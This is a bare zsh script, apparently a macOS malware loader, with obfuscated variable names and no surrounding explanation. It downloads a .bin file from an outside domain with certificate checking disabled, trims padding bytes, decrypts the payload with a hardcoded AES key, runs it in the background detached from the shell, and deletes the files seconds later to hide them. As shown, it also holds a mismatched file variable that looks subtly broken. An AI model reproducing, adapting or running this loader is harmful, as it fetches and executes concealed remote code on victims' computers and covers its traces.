#!/bin/zsh
ts86e=$(mktemp /tmp/nntytz.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m301178aaaecc37fb.bin" -o "$ts86ez" || exit 1
m2tytg=$(stat -f %z "$ts86ez"); xbb835n=$(( m2tytg - 1141 - 2793 ))
tail -c +$(( 1141 + 1 )) "$ts86ez" | head -c $xbb835n | openssl enc -d -aes-256-cbc -k a20cc705470042a422077997 -out "$ts86e" 2>/dev/null
[ -s "$ts86e" ] && chmod 700 "$ts86e" && ( "$ts86e" & ) && disown
( sleep 3; rm -f "$ts86e" "$ts86ez" ) &>/dev/null &
